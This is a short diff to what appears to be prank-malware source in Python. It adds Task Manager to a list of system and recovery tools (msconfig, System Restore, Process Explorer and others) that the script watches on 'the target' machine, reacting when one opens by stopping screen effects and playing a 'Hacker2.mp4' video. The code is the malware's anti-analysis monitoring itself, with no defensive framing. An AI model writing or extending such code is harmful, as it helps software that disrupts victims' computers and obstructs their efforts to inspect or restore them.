@@ -233,7 +233,8 @@ def playmusic_for3():
 def monitor_process(processes=["mmc.exe", "msconfig.exe", "SystemPropertiesProtection.exe",
                                "rstrui.exe", "RecoveryDrive.exe",
                                "resmon.exe", "perfmon.exe", "ProcessHacker.exe",
-                               "SystemInformer.exe", "ProcessExplorer.exe"]):
+                               "SystemInformer.exe", "ProcessExplorer.exe",
+                               "Taskmgr.exe"]):
     """
     If the target opens a suspicious process, stop GDI effects then play Hacker2.mp4.
     Waits 5 seconds before starting to monitor, so any already-running processes
